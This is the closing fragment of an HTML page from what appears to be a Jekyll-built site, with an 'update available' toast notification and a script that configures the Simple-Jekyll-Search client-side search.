  <div class="toast-header">
    <button
      type="button"
      class="btn-close ms-auto"
      data-bs-dismiss="toast"
      aria-label="Close"
    ></button>
  </div>
  <div class="toast-body text-center pt-0">
    <p class="px-2 mb-3">A new version of content is available.</p>
    <button type="button" class="btn btn-primary" aria-label="Update">
      Update
    </button>
  </div>
</aside>

    

    <!-- Embedded scripts -->

    
      
      <!-- The comments switcher -->


    

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script>
  
  document.addEventListener('DOMContentLoaded', () => {
    SimpleJekyllSearch({
      searchInput: document.getElementById('search-input'),
      resultsContainer: document.getElementById('search-results'),
      json: '/assets/js/data/search.json',
      searchResultTemplate: '  <article class="px-1 px-sm-2 px-lg-4 px-xl-0">    <header>      <h2><a href="{url}">{title}</a></h2>      <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">        {categories}        {tags}      </div>    </header>    <p>{content}</p>  </article>',
      noResultsText: '<p class="mt-5">Oops! No results found.</p>',
      templateMiddleware: function(prop, value, template) {
        if (prop === 'categories') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
          }
        }

        if (prop === 'tags') {
          if (value === '') {
            return `${value}`;
          } else {
            return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
          }
        }
      }
    });
  });
</script>

  </body>
</html>

